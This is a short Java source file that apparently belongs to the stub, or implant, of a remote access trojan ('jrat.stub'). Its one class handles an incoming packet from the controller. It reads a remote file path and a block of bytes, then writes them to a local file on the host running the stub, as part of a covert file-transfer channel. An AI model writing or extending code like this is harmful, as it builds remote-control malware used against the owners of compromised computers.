package se.jrat.stub.packets.incoming;

import se.jrat.common.io.FileCache;
import se.jrat.common.io.TransferData;
import se.jrat.stub.Connection;

public class Packet104ClientDownloadPart extends AbstractIncomingPacket {

	@Override
	public void read(Connection con) throws Exception {
		final String remotePath = con.readLine();

		TransferData localData = FileCache.get(remotePath);
		
		byte[] buffer = new byte[con.readInt()];
		con.getDataInputStream().readFully(buffer);

		localData.getOutputStream().write(buffer);
		localData.increaseRead(buffer.length);
	}

}
